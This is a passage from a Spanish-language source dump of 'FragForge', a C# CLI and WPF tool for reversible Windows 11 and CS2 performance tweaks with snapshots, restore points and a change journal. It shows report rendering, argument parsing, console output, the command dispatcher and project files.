        builder.Append("<h2>Hardware y sistema</h2><table>");
        Row(builder, "Equipo", h.MachineName + " / " + h.FormFactor.SystemModel);
        Row(builder, "SO", $"{h.Os.Name} {h.Os.Build}.{h.Os.Ubr} {h.Os.Architecture} {h.Os.Culture}");
        Row(builder, "CPU", $"{h.Cpu.Model}; P={h.Cpu.PCores?.ToString() ?? "?"}, E={h.Cpu.ECores?.ToString() ?? "?"}, hilos={h.Cpu.LogicalProcessors}, híbrida={h.Cpu.IsHybrid?.ToString() ?? "Unknown"}");
        Row(builder, "RAM", $"{h.Memory.TotalBytes} bytes; canales={h.Memory.Channels}; módulos={h.Memory.Modules.Count}; velocidad={h.Memory.ConfiguredSpeedMtPerSecond?.ToString() ?? "Unknown"}");
        Row(builder, "GPU", string.Join("; ", h.Gpus.Select(g => $"{g.Name} ({g.Vendor}, integrada={g.IsIntegrated})")));
        Row(builder, "Discos", string.Join("; ", h.Disks.Select(d => $"{d.Model} {d.Kind} {d.Bus} {d.Health} SMART={d.SmartPredictFailure?.ToString() ?? "Unavailable"}")));
        Row(builder, "Red", string.Join("; ", h.NetworkAdapters.Select(a => $"{a.Name}: {a.Description} {a.Kind} {a.LinkSpeedBitsPerSecond} bps driver={a.DriverVersion}")));
        Row(builder, "Monitores", string.Join("; ", h.Monitors.Select(m => $"{m.Name} {m.Width}x{m.Height}@{m.RefreshRateHz}Hz")));
        Row(builder, "Seguridad", $"VBS={h.Security.Vbs}; HVCI={h.Security.Hvci}; SecureBoot={h.Security.SecureBoot}; TPM={h.Security.Tpm} {h.Security.TpmVersion}");
        Row(builder, "Energía", $"{h.Power.ActiveSchemeName} {h.Power.ActiveSchemeGuid}; PL1={h.Power.Pl1Watts?.ToString() ?? "Unknown"}; PL2={h.Power.Pl2Watts?.ToString() ?? "Unknown"}");
        Row(builder, "Atlas", string.Join("; ", h.Playbooks.Select(p => $"{p.Name} [{p.Confidence}]: {string.Join(", ", p.Evidence)}")));
        Row(builder, "Dispositivos con error", string.Join("; ", h.DeviceErrors.Select(d => $"{d.Name} código={d.ErrorCode} {d.InstanceId}")));
        Row(builder, "CS2", h.Games.Cs2ExecutablePath ?? h.Games.Cs2DetectionSource);
        Row(builder, "Advertencias", string.Join(" | ", h.ProbeWarnings));
        builder.Append("</table><h2>Preflight</h2><table><tr><th>ID</th><th>Severidad</th><th>Mensaje</th></tr>");
        foreach (var check in report.Preflight.Checks) builder.Append("<tr><td>").Append(E(check.Id)).Append("</td><td>").Append(E(check.Severity.ToString())).Append("</td><td>").Append(E(check.Message)).Append("</td></tr>");
        builder.Append("</table><h2>Tweaks</h2><table><tr><th>ID</th><th>Estado</th><th>Motivo</th></tr>");
        foreach (var tweak in report.Tweaks) builder.Append("<tr><td>").Append(E(tweak.Id)).Append("</td><td>").Append(E(tweak.State.ToString())).Append("</td><td>").Append(E(tweak.Reason)).Append("</td></tr>");
        builder.Append("</table><h2>Snapshots</h2><table><tr><th>ID</th><th>Etiqueta</th><th>Creado</th><th>Tweaks</th><th>Revertido</th></tr>");
        foreach (var snapshot in report.Snapshots) builder.Append("<tr><td>").Append(E(snapshot.Id)).Append("</td><td>").Append(E(snapshot.Label)).Append("</td><td>").Append(E(snapshot.CreatedAt.ToString("O"))).Append("</td><td>").Append(snapshot.TweakCount).Append("</td><td>").Append(snapshot.Reverted).Append("</td></tr>");
        builder.Append("</table><p>Journal: ").Append(report.JournalIntegrity.IsValid ? "íntegro" : "DAÑADO").Append(" · entradas recientes: ").Append(report.RecentJournal.Count).Append("</p></html>");
        return builder.ToString();
        static void Row(StringBuilder b, string key, string? value) => b.Append("<tr><th>").Append(E(key)).Append("</th><td>").Append(E(value ?? "")).Append("</td></tr>");
        static string E(string? value) => WebUtility.HtmlEncode(value ?? "");
    }
}
````

### `src/FragForge.Composition/UnsupportedPlatformServices.cs`  <sub>(35 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Composition;

public sealed class UnsupportedWmiQuery : IWmiQuery
{
    public Task<IReadOnlyList<IReadOnlyDictionary<string, object?>>> QueryAsync(string scope, string className, IReadOnlyList<string> properties, string? where = null, CancellationToken cancellationToken = default) => Task.FromResult<IReadOnlyList<IReadOnlyDictionary<string, object?>>>([]);
}
public sealed class UnsupportedServiceController : IServiceController
{
    public Task<ServiceCapture> GetAsync(string name, CancellationToken cancellationToken = default) => Task.FromResult(new ServiceCapture { Name = name, Exists = false });
    public Task SetStartModeAsync(string name, string startMode, bool? delayedAutoStart, CancellationToken cancellationToken = default, bool restoreAbsentDelayed = false) => throw new PlatformNotSupportedException();
    public Task SetStateAsync(string name, string state, CancellationToken cancellationToken = default) => throw new PlatformNotSupportedException();
}
public sealed class UnsupportedScheduledTaskStore : IScheduledTaskStore
{
    public Task<ScheduledTaskActionState> GetAsync(string path, CancellationToken cancellationToken = default) => Task.FromResult(new ScheduledTaskActionState { Path = path, Exists = false, Enabled = false });
    public Task SetEnabledAsync(string path, bool enabled, CancellationToken cancellationToken = default) => throw new PlatformNotSupportedException();
}
public sealed class UnsupportedNetworkAdapterController : INetworkAdapterController
{
    public Task<NetworkPropertyCapture> GetAsync(string adapterName, string keyword, CancellationToken cancellationToken = default) => Task.FromResult(new NetworkPropertyCapture { AdapterName = adapterName, Keyword = keyword, Exists = false });
    public Task SetAsync(string adapterName, string keyword, IReadOnlyList<string> value, CancellationToken cancellationToken = default) => throw new PlatformNotSupportedException();
}
public sealed class UnsupportedSystemRestoreService : ISystemRestoreService
{
    public Task<FeatureState> GetProtectionStateAsync(CancellationToken cancellationToken = default) => Task.FromResult(FeatureState.NotPresent);
    public Task EnableProtectionAsync(CancellationToken cancellationToken = default) => throw new PlatformNotSupportedException();
    public Task<RestorePointResult> CreateAsync(string description, CancellationToken cancellationToken = default) => throw new PlatformNotSupportedException();
}
public sealed class UnsupportedGameLocator : IGameLocator
{
    public Task<GameInfo> LocateCs2Async(CancellationToken cancellationToken = default) => Task.FromResult(new GameInfo());
}
````

---

## 3e. FragForge.Cli — fragforge.exe

### `src/FragForge.Cli/CommandLine.cs`  <sub>(44 líneas)</sub>

````csharp
namespace FragForge.Cli;

public sealed class ParsedArgs
{
    public string Command { get; init; } = "help";
    public IReadOnlyList<string> Positionals { get; init; } = [];
    public IReadOnlyDictionary<string, List<string>> Options { get; init; } = new Dictionary<string, List<string>>(StringComparer.OrdinalIgnoreCase);
    public bool Has(string name) => Options.ContainsKey(name);
    public string? Value(string name) => Options.TryGetValue(name, out var values) ? values.LastOrDefault() : null;
    public IReadOnlyList<string> Values(string name) => Options.TryGetValue(name, out var values) ? values : [];
}
public static class CommandLineParser
{
    private static readonly HashSet<string> Flags = new(StringComparer.OrdinalIgnoreCase) { "json", "dry-run", "force", "no-restore-point", "enable-system-protection", "last", "allow-powershell", "help" };
    private static readonly HashSet<string> ValueOptions = new(StringComparer.OrdinalIgnoreCase) { "profile", "category", "risk", "out", "format", "snapshot", "label", "culture", "data-root", "cs2-path", "user-sid", "accept-risk", "risk-phrase" };
    public static ParsedArgs Parse(string[] args)
    {
        if (args.Length == 0 || args[0] is "--help" or "-h" or "help") return new ParsedArgs { Command = "help" };
        var command = args[0].ToLowerInvariant();
        var positionals = new List<string>();
        var options = new Dictionary<string, List<string>>(StringComparer.OrdinalIgnoreCase);
        for (var i = 1; i < args.Length; i++)
        {
            var token = args[i];
            if (!token.StartsWith("--", StringComparison.Ordinal)) { positionals.Add(token); continue; }
            var name = token[2..];
            if (Flags.Contains(name)) { options[name] = ["true"]; continue; }
            if (!ValueOptions.Contains(name)) throw new ArgumentException($"Opción desconocida: --{name}");
            if (i + 1 >= args.Length || args[i + 1].StartsWith("--", StringComparison.Ordinal)) throw new ArgumentException($"Falta el valor de --{name}");
            if (!options.TryGetValue(name, out var values)) { values = []; options[name] = values; }
            values.Add(args[++i]);
        }
        return new ParsedArgs { Command = command, Positionals = positionals, Options = options };
    }
}
public static class ExitCodes
{
    public const int Success = 0;
    public const int Failure = 1;
    public const int Usage = 2;
    public const int Preflight = 3;
    public const int Cancelled = 4;
    public const int RollbackCritical = 5;
}
````

### `src/FragForge.Cli/ConsoleOutput.cs`  <sub>(71 líneas)</sub>

````csharp
using System.Text.Json;
using FragForge.Core.Abstractions;
using FragForge.Core.Logging;
using FragForge.Core.Models;

namespace FragForge.Cli;

public static class ConsoleOutput
{
    public static void Json<T>(T value) => Console.WriteLine(JsonSerializer.Serialize(value, JsonDefaults.Options));
    public static void Hardware(HardwareProfile h)
    {
        Console.WriteLine("=== Hardware / sistema ===");
        Console.WriteLine($"Equipo       : {h.MachineName} · {h.FormFactor.SystemModel ?? "Unknown"} · BIOS {h.FormFactor.BiosVersion ?? "Unknown"}");
        Console.WriteLine($"SO           : {h.Os.Name} {h.Os.Build}.{h.Os.Ubr} · {h.Os.Architecture} · {h.Os.Culture} · {h.Os.TimeZone}");
        Console.WriteLine($"Usuario      : {h.InteractiveUserName ?? "Unknown"} · SID {h.InteractiveUserSid ?? "Unknown"}");
        Console.WriteLine($"CPU          : {h.Cpu.Model} · {h.Cpu.PhysicalCores} núcleos / {h.Cpu.LogicalProcessors} hilos · P={h.Cpu.PCores?.ToString() ?? "?"} E={h.Cpu.ECores?.ToString() ?? "?"} · híbrida={h.Cpu.IsHybrid?.ToString() ?? "Unknown"}");
        Console.WriteLine($"RAM          : {h.Memory.TotalBytes:N0} bytes · canales={h.Memory.Channels} · módulos={h.Memory.Modules.Count} · velocidad={h.Memory.ConfiguredSpeedMtPerSecond?.ToString() ?? "Unknown"} MT/s");
        foreach (var module in h.Memory.Modules) Console.WriteLine($"  DIMM       : {module.BankLabel}/{module.DeviceLocator} {module.CapacityBytes:N0} bytes {module.PartNumber}");
        Console.WriteLine($"GPU          : {string.Join("; ", h.Gpus.Select(g => $"{g.Name} [{g.Vendor}] integrada={g.IsIntegrated} driver={g.DriverVersion}"))}");
        foreach (var disk in h.Disks) Console.WriteLine($"Disco        : {disk.Model} · {disk.Kind} · {disk.Bus} · {disk.SizeBytes:N0} bytes · salud={disk.Health} · SMART={disk.SmartPredictFailure?.ToString() ?? "Unavailable"}");
        foreach (var adapter in h.NetworkAdapters) Console.WriteLine($"Red          : {adapter.Name} · {adapter.Description} · {adapter.Kind} · {adapter.LinkSpeedBitsPerSecond?.ToString() ?? "?"} bps · driver={adapter.DriverVersion} · físico={adapter.IsPhysical}");
        foreach (var monitor in h.Monitors) Console.WriteLine($"Monitor      : {monitor.Name} · {monitor.Width}x{monitor.Height}@{monitor.RefreshRateHz}Hz ({monitor.Source})");
        Console.WriteLine($"Seguridad    : VBS={h.Security.Vbs} HVCI={h.Security.Hvci} SecureBoot={h.Security.SecureBoot} TPM={h.Security.Tpm} {h.Security.TpmVersion} HAGS={h.Security.Hags} MPO={h.Security.Mpo}");
        Console.WriteLine($"Energía      : {h.Power.ActiveSchemeName ?? "Unknown"} ({h.Power.ActiveSchemeGuid ?? "?"}) · PL1={h.Power.Pl1Watts?.ToString() ?? "Unknown"} W · PL2={h.Power.Pl2Watts?.ToString() ?? "Unknown"} W");
        Console.WriteLine($"Factor forma : portátil={h.FormFactor.IsPortable?.ToString() ?? "Unknown"} · batería={h.FormFactor.HasBattery} · chasis={string.Join(",", h.FormFactor.ChassisTypes)}");
        Console.WriteLine($"Playbooks    : {string.Join("; ", h.Playbooks.Select(p => $"{p.Name} [{p.Confidence}]"))}");
        foreach (var error in h.DeviceErrors) Console.WriteLine($"Device error : {error.Name} · código {error.ErrorCode} · {error.InstanceId}");
        Console.WriteLine($"Mantenimiento: reinicio pendiente={h.Maintenance.PendingReboot} ({string.Join("; ", h.Maintenance.PendingRebootReasons)}) · servicing={h.Maintenance.WindowsServicingActive} ({string.Join(",", h.Maintenance.ServicingProcesses)}) · admin={h.Maintenance.IsAdministrator} · libre={h.Maintenance.SystemDriveFreeBytes / 1024 / 1024} MiB · protección={h.Maintenance.SystemProtection}");
        Console.WriteLine($"CS2          : {h.Games.Cs2ExecutablePath ?? h.Games.Cs2DetectionSource}");
        foreach (var warning in h.ProbeWarnings) Console.WriteLine($"Aviso        : {warning}");
    }
    public static void Tweaks(IEnumerable<TweakStatus> statuses, IEnumerable<TweakDefinition> definitions)
    {
        var map = definitions.ToDictionary(d => d.Id, StringComparer.OrdinalIgnoreCase);
        Console.WriteLine();
        Console.WriteLine($"{"ID",-42} {"Categoría",-12} {"Evidencia",-13} {"Riesgo",-13} {"Estado",-20} Motivo");
        foreach (var status in statuses)
        {
            var d = map[status.Id];
            Console.WriteLine($"{status.Id,-42} {d.Category,-12} {d.Evidence,-13} {d.Risk,-13} {status.State,-20} {status.Reason}");
            foreach (var observation in status.Observations) Console.WriteLine($"  {observation.Key}: {observation.Value} [{observation.Confidence}] {observation.Note}");
        }
    }
    public static void Definitions(IEnumerable<TweakDefinition> definitions, string culture)
    {
        Console.WriteLine($"{"ID",-42} {"Categoría",-12} {"Evidencia",-13} {"Riesgo",-13} Título");
        foreach (var d in definitions) Console.WriteLine($"{d.Id,-42} {d.Category,-12} {d.Evidence,-13} {d.Risk,-13} {d.Title.Resolve(culture)}");
    }
    public static void Batch(BatchReport report)
    {
        Console.WriteLine();
        Console.WriteLine($"Operación: {report.OperationId} · éxito={report.Success} · dry-run={report.DryRun} · cancelado={report.Cancelled}");
        if (report.SnapshotId is not null) Console.WriteLine($"Snapshot : {report.SnapshotId}");
        if (report.RestorePointSequence is not null) Console.WriteLine($"Restore  : punto {report.RestorePointSequence}");
        foreach (var result in report.Results)
        {
            Console.WriteLine($"- {result.Id}: {result.State} · {result.Message}");
            foreach (var change in result.PlannedChanges) Console.WriteLine($"  [{change.ActionIndex}] {change.Kind}: {change.Description}");
            foreach (var warning in result.Warnings) Console.WriteLine($"  Aviso: {warning}");
        }
        foreach (var warning in report.Warnings) Console.WriteLine($"Aviso: {warning}");
        foreach (var error in report.Errors) Console.Error.WriteLine($"Error: {error}");
        if (report.HasCriticalFailure) Console.Error.WriteLine("CRÍTICO: una reversión quedó incompleta. No sigas aplicando cambios; revisa snapshot/journal y la guía de recuperación manual.");
    }
    public static void Preflight(PreflightReport report)
    {
        Console.WriteLine($"Preflight: {(report.CanApply ? "APTO" : "BLOQUEADO")}");
        foreach (var check in report.Checks) Console.WriteLine($"[{check.Severity}] {check.Id}: {check.Message}{(check.Remediation is null ? "" : " → " + check.Remediation)}");
    }
}
````

### `src/FragForge.Cli/FragForge.Cli.csproj`  <sub>(18 líneas)</sub>

````xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <AssemblyName>fragforge</AssemblyName>
    <ApplicationManifest>app.manifest</ApplicationManifest>
    <InvariantGlobalization>false</InvariantGlobalization>
    <PublishTrimmed>false</PublishTrimmed>
  </PropertyGroup>
  <!-- Publish settings apply only when a RID is supplied, e.g.
       dotnet publish src/FragForge.Cli/FragForge.Cli.csproj -c Release -r win-x64 -->
  <PropertyGroup Condition="'$(RuntimeIdentifier)' != ''">
    <SelfContained Condition="'$(SelfContained)' == ''">true</SelfContained>
    <PublishSingleFile Condition="'$(PublishSingleFile)' == ''">true</PublishSingleFile>
    <IncludeNativeLibrariesForSelfExtract Condition="'$(IncludeNativeLibrariesForSelfExtract)' == ''">true</IncludeNativeLibrariesForSelfExtract>
    <EnableCompressionInSingleFile Condition="'$(EnableCompressionInSingleFile)' == ''">true</EnableCompressionInSingleFile>
  </PropertyGroup>
  <ItemGroup><ProjectReference Include="../FragForge.Composition/FragForge.Composition.csproj" /></ItemGroup>
</Project>
````

### `src/FragForge.Cli/Program.cs`  <sub>(160 líneas)</sub>

````csharp
using FragForge.Composition;
using FragForge.Core.Abstractions;
using FragForge.Core.Engine;
using FragForge.Core.Localization;
using FragForge.Core.Models;
using FragForge.Core.Persistence;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;

namespace FragForge.Cli;

public static class Program
{
    public static async Task<int> Main(string[] args)
    {
        using var cancellation = new CancellationTokenSource();
        ConsoleCancelEventHandler handler = (_, e) => { e.Cancel = true; cancellation.Cancel(); };
        Console.CancelKeyPress += handler;
        try
        {
            var parsed = CommandLineParser.Parse(args);
            if (parsed.Command == "help") { Help(); return ExitCodes.Success; }
            var options = new ShellOptions(parsed.Value("data-root"), parsed.Value("culture") ?? "es-MX");
            using var host = await CompositionRoot.BuildAsync(options, cancellation.Token);
            var engine = host.Services.GetRequiredService<ITweakEngine>();
            var catalog = host.Services.GetRequiredService<ITweakCatalog>();
            var localizer = host.Services.GetRequiredService<Localizer>();
            var snapshots = host.Services.GetRequiredService<ISnapshotStore>();
            var journal = host.Services.GetRequiredService<IJournal>();
            var preflight = host.Services.GetRequiredService<IPreflightService>();
            var reports = host.Services.GetRequiredService<IReportService>();
            var profiler = host.Services.GetRequiredService<IHardwareProfiler>();
            var progress = new Progress<EngineProgress>(p => Console.Error.WriteLine($"[{p.Stage}] {p.TweakId ?? "system"} {p.Fraction:P0} {p.Message}"));
            switch (parsed.Command)
            {
                case "scan":
                {
                    var scan = await engine.ScanAsync(cancellation.Token, progress);
                    if (parsed.Has("json")) ConsoleOutput.Json(scan); else { ConsoleOutput.Hardware(scan.Hardware); ConsoleOutput.Tweaks(scan.Tweaks, catalog.Definitions); }
                    return ExitCodes.Success;
                }
                case "list":
                {
                    var definitions = catalog.Definitions.AsEnumerable();
                    if (parsed.Value("category") is { } category) definitions = definitions.Where(d => d.Category.Equals(category, StringComparison.OrdinalIgnoreCase));
                    if (parsed.Value("risk") is { } risk) definitions = definitions.Where(d => d.Risk.ToString().Equals(risk, StringComparison.OrdinalIgnoreCase));
                    if (parsed.Has("json")) ConsoleOutput.Json(definitions.ToArray()); else ConsoleOutput.Definitions(definitions, localizer.Culture);
                    return ExitCodes.Success;
                }
                case "apply":
                {
                    var profile = ParseProfile(parsed.Value("profile") ?? (parsed.Positionals.Count > 0 ? "Balanced" : "Safe"));
                    var ids = parsed.Positionals.Count > 0 ? parsed.Positionals.ToArray() : ProfileSelector.Select(catalog.Definitions, profile).Select(d => d.Id).ToArray();
                    if (ids.Length == 0) throw new ArgumentException("apply requiere IDs o --profile con tweaks disponibles.");
                    var applyOptions = new ApplyOptions
                    {
                        DryRun = parsed.Has("dry-run"), Force = parsed.Has("force"), CreateRestorePoint = !parsed.Has("no-restore-point"), EnableSystemProtection = parsed.Has("enable-system-protection"), Profile = profile,
                        RiskAcknowledgements = parsed.Values("accept-risk").ToHashSet(StringComparer.OrdinalIgnoreCase), AdvancedRiskPhrase = parsed.Value("risk-phrase"), Cs2ExecutableOverride = parsed.Value("cs2-path"), TargetUserSid = parsed.Value("user-sid"), AllowPowerShellActions = parsed.Has("allow-powershell")
                    };
                    var report = await engine.ApplyAsync(ids, applyOptions, cancellation.Token, progress);
                    if (parsed.Has("json")) ConsoleOutput.Json(report); else ConsoleOutput.Batch(report);
                    return ReportExit(report);
                }
                case "revert":
                {
                    var request = new RevertRequest { Ids = parsed.Positionals.ToArray(), SnapshotId = parsed.Value("snapshot"), Last = parsed.Has("last"), Options = new RevertOptions { Force = parsed.Has("force"), TargetUserSid = parsed.Value("user-sid"), Cs2ExecutableOverride = parsed.Value("cs2-path") } };
                    var report = await engine.RevertAsync(request, cancellation.Token, progress);
                    if (parsed.Has("json")) ConsoleOutput.Json(report); else ConsoleOutput.Batch(report);
                    return ReportExit(report);
                }
                case "status":
                {
                    var scan = await engine.ScanAsync(cancellation.Token, progress);
                    var integrity = await journal.VerifyIntegrityAsync(cancellation.Token);
                    var list = await snapshots.ListAsync(cancellation.Token);
                    if (parsed.Has("json")) ConsoleOutput.Json(new { scan.Hardware, scan.Tweaks, JournalIntegrity = integrity, Snapshots = list.Count });
                    else { Console.WriteLine($"Journal: {(integrity.IsValid ? "íntegro" : "DAÑADO")} ({integrity.Entries} entradas) · snapshots={list.Count}"); ConsoleOutput.Tweaks(scan.Tweaks, catalog.Definitions); }
                    return integrity.IsValid ? ExitCodes.Success : ExitCodes.Failure;
                }
                case "snapshot":
                {
                    var sub = parsed.Positionals.FirstOrDefault() ?? "list";
                    if (sub == "create")
                    {
                        var snapshot = await engine.CreateSnapshotAsync(parsed.Value("label") ?? "manual", !parsed.Has("no-restore-point"), cancellation.Token, progress);
                        if (parsed.Has("json")) ConsoleOutput.Json(snapshot); else Console.WriteLine($"Snapshot creado: {snapshot.Id} · tweaks={snapshot.Tweaks.Count} · restore={snapshot.RestorePointSequence?.ToString() ?? "ninguno"}");
                        return ExitCodes.Success;
                    }
                    if (sub == "show")
                    {
                        var id = parsed.Positionals.ElementAtOrDefault(1) ?? throw new ArgumentException("snapshot show requiere ID.");
                        ConsoleOutput.Json(await snapshots.GetAsync(id, cancellation.Token));
                        return ExitCodes.Success;
                    }
                    if (sub == "list")
                    {
                        var entries = await journal.ReadAllAsync(cancellation.Token);
                        var reverted = entries.Where(e => e.EventType == JournalEventType.SnapshotReverted && e.SnapshotId is not null).Select(e => e.SnapshotId!).ToHashSet(StringComparer.OrdinalIgnoreCase);
                        var items = (await snapshots.ListAsync(cancellation.Token)).Select(s => new SnapshotListItem(s.Id, s.Label, s.CreatedAt, s.Tweaks.Count, s.RestorePointSequence, reverted.Contains(s.Id))).ToArray();
                        if (parsed.Has("json")) ConsoleOutput.Json(items);
                        else foreach (var item in items) Console.WriteLine($"{item.Id}  {item.CreatedAt:O}  tweaks={item.TweakCount}  revertido={item.Reverted}  {item.Label}");
                        return ExitCodes.Success;
                    }
                    throw new ArgumentException("snapshot admite list|create|show.");
                }
                case "export-report":
                {
                    var output = parsed.Value("out") ?? throw new ArgumentException("export-report requiere --out.");
                    var format = parsed.Value("format") ?? Path.GetExtension(output).TrimStart('.').ToLowerInvariant();
                    await reports.ExportAsync(output, format, cancellation.Token);
                    Console.WriteLine($"Informe exportado: {Path.GetFullPath(output)}");
                    return ExitCodes.Success;
                }
                case "doctor":
                {
                    var hardware = await profiler.ProfileAsync(cancellation.Token, progress);
                    var check = await preflight.CheckAsync(new ApplyOptions { CreateRestorePoint = true, Profile = TweakProfile.Safe }, hardware, cancellation.Token);
                    var integrity = await journal.VerifyIntegrityAsync(cancellation.Token);
                    if (parsed.Has("json")) ConsoleOutput.Json(new { Preflight = check, CatalogCount = catalog.Definitions.Count, JournalIntegrity = integrity });
                    else { ConsoleOutput.Preflight(check); Console.WriteLine($"Catálogo: {catalog.Definitions.Count} tweaks válidos · journal {(integrity.IsValid ? "íntegro" : "DAÑADO: " + integrity.Error)}"); }
                    return check.CanApply && integrity.IsValid ? ExitCodes.Success : ExitCodes.Preflight;
                }
                default: throw new ArgumentException($"Comando desconocido: {parsed.Command}");
            }
        }
        catch (OperationCanceledException) { Console.Error.WriteLine("Operación cancelada. Si había una aplicación en curso, consulta el journal antes de continuar."); return ExitCodes.Cancelled; }
        catch (ArgumentException ex) { Console.Error.WriteLine(ex.Message); Help(); return ExitCodes.Usage; }
        catch (CatalogValidationException ex) { Console.Error.WriteLine(ex.Message); foreach (var error in ex.Errors) Console.Error.WriteLine("  " + error); return ExitCodes.Preflight; }
        catch (PreflightFailedException ex) { Console.Error.WriteLine(ex.Message); ConsoleOutput.Preflight(ex.Report); return ExitCodes.Preflight; }
        catch (FragForgeException ex) { Console.Error.WriteLine($"[{ex.Code}] {ex.Message}"); return ex.Code == "rollback_failed" ? ExitCodes.RollbackCritical : ExitCodes.Failure; }
        catch (Exception ex) { Console.Error.WriteLine($"Error inesperado: {ex.GetType().Name}: {ex.Message}"); return ExitCodes.Failure; }
        finally { Console.CancelKeyPress -= handler; }
    }
    private static TweakProfile ParseProfile(string value) => Enum.TryParse<TweakProfile>(value, true, out var profile) ? profile : throw new ArgumentException("Perfil debe ser Safe, Balanced, Competitive o Advanced.");
    private static int ReportExit(BatchReport report) => report.HasCriticalFailure ? ExitCodes.RollbackCritical : report.Cancelled ? ExitCodes.Cancelled : report.Success ? ExitCodes.Success : ExitCodes.Failure;
    private static void Help()
    {
        Console.WriteLine("""
FragForge Capa 0 — optimizador reversible para Windows 11 / CS2

Uso:
  fragforge scan [--json] [--culture es-MX|en-US]
  fragforge list [--category X] [--risk Safe|Moderate|Advanced|Experimental] [--json]
  fragforge apply <ids...|--profile Safe|Balanced|Competitive|Advanced> [--dry-run] [--force]
                  [--no-restore-point] [--enable-system-protection] [--cs2-path RUTA]
                  [--user-sid SID] [--accept-risk ID] [--risk-phrase "ACEPTO EL RIESGO"]
                  [--allow-powershell] [--json]
  fragforge revert <ids...|--snapshot ID|--last> [--force] [--json]
  fragforge status [--json]
  fragforge snapshot list|create|show [ID] [--label TEXTO] [--no-restore-point] [--json]
  fragforge export-report --out reporte.html|json [--format html|json]
  fragforge doctor [--json]

Opciones globales: --data-root RUTA --culture es-MX|en-US
Códigos: 0 éxito; 1 fallo; 2 uso; 3 preflight/catálogo; 4 cancelación; 5 rollback crítico.
Seguridad: Force solo omite idempotencia/drift; nunca denylist, condiciones ni preflight.
Los tweaks Advanced/Experimental requieren perfil Advanced, --accept-risk ID y la frase exacta.
""");
    }
}
````

### `src/FragForge.Cli/app.manifest`  <sub>(15 líneas)</sub>

````xml
<?xml version="1.0" encoding="utf-8"?>
<assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1">
  <assemblyIdentity version="1.0.0.0" name="FragForge.Cli" />
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"><security><requestedPrivileges>
    <requestedExecutionLevel level="requireAdministrator" uiAccess="false" />
  </requestedPrivileges></security></trustInfo>
  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1"><application>
    <supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}" />
  </application></compatibility>
  <application xmlns="urn:schemas-microsoft-com:asm.v3"><windowsSettings>
    <dpiAware xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true/pm</dpiAware>
    <dpiAwareness xmlns="http://schemas.microsoft.com/SMI/2016/WindowsSettings">PerMonitorV2</dpiAwareness>
    <longPathAware xmlns="http://schemas.microsoft.com/SMI/2016/WindowsSettings">true</longPathAware>
  </windowsSettings></application>
</assembly>
````

---

## 3f. FragForge.App — shell WPF MVVM

### `src/FragForge.App/App.xaml`  <sub>(27 líneas)</sub>

````xml
<Application x:Class="FragForge.App.App"
             xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
  <Application.Resources>
    <SolidColorBrush x:Key="PanelBrush" Color="#171E26"/>
    <SolidColorBrush x:Key="BorderBrush" Color="#2D3947"/>
    <SolidColorBrush x:Key="AccentBrush" Color="#4FB3FF"/>
    <Style TargetType="Button">
      <Setter Property="Background" Value="#243140"/>
      <Setter Property="Foreground" Value="#E8EDF2"/>
      <Setter Property="BorderBrush" Value="#3B4C60"/>
      <Setter Property="Padding" Value="10,5"/>
      <Setter Property="Margin" Value="0,0,6,0"/>
    </Style>
    <Style TargetType="TextBox">
      <Setter Property="Background" Value="#0D1218"/>
      <Setter Property="Foreground" Value="#E8EDF2"/>
      <Setter Property="BorderBrush" Value="#3B4C60"/>
      <Setter Property="Padding" Value="4"/>
    </Style>
    <Style TargetType="ComboBox">
      <Setter Property="Background" Value="#243140"/>
      <Setter Property="Foreground" Value="#E8EDF2"/>
      <Setter Property="Margin" Value="0,0,8,0"/>
    </Style>
  </Application.Resources>
</Application>
````

### `src/FragForge.App/App.xaml.cs`  <sub>(43 líneas)</sub>

````csharp
using System.Windows;
using FragForge.App.Services;
using FragForge.App.ViewModels;
using FragForge.Composition;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;

namespace FragForge.App;

public partial class App : Application
{
    private IHost? _host;
    protected override async void OnStartup(StartupEventArgs e)
    {
        base.OnStartup(e);
        try
        {
            var options = new ShellOptions(ConsoleLogging: false, ConfigureServices: services =>
            {
                services.AddSingleton<IConfirmationService, WpfConfirmationService>();
                services.AddSingleton<IFileDialogService, WpfFileDialogService>();
                services.AddSingleton<MainViewModel>();
            });
            _host = await CompositionRoot.BuildAsync(options);
            var viewModel = _host.Services.GetRequiredService<MainViewModel>();
            var window = new MainWindow { DataContext = viewModel };
            MainWindow = window;
            window.Show();
            await viewModel.ScanCommand.ExecuteAsync(null);
        }
        catch (Exception ex)
        {
            MessageBox.Show("No se pudo iniciar FragForge:\n" + ex.Message, "FragForge", MessageBoxButton.OK, MessageBoxImage.Error);
            Shutdown(1);
        }
    }
    protected override void OnExit(ExitEventArgs e)
    {
        if (MainWindow?.DataContext is MainViewModel viewModel) viewModel.Dispose();
        _host?.Dispose();
        base.OnExit(e);
    }
}
````

### `src/FragForge.App/FragForge.App.csproj`  <sub>(22 líneas)</sub>

````xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>WinExe</OutputType>
    <TargetFramework>net10.0-windows</TargetFramework>
    <UseWPF>true</UseWPF>
    <AssemblyName>FragForge</AssemblyName>
    <EnableWindowsTargeting>true</EnableWindowsTargeting>
    <ApplicationManifest>app.manifest</ApplicationManifest>
    <InvariantGlobalization>false</InvariantGlobalization>
    <PublishTrimmed>false</PublishTrimmed>
  </PropertyGroup>
  <!-- Publish settings apply only when a RID is supplied, e.g.
       dotnet publish src/FragForge.App/FragForge.App.csproj -c Release -r win-x64 -->
  <PropertyGroup Condition="'$(RuntimeIdentifier)' != ''">
    <SelfContained Condition="'$(SelfContained)' == ''">true</SelfContained>
    <PublishSingleFile Condition="'$(PublishSingleFile)' == ''">true</PublishSingleFile>
    <IncludeNativeLibrariesForSelfExtract Condition="'$(IncludeNativeLibrariesForSelfExtract)' == ''">true</IncludeNativeLibrariesForSelfExtract>
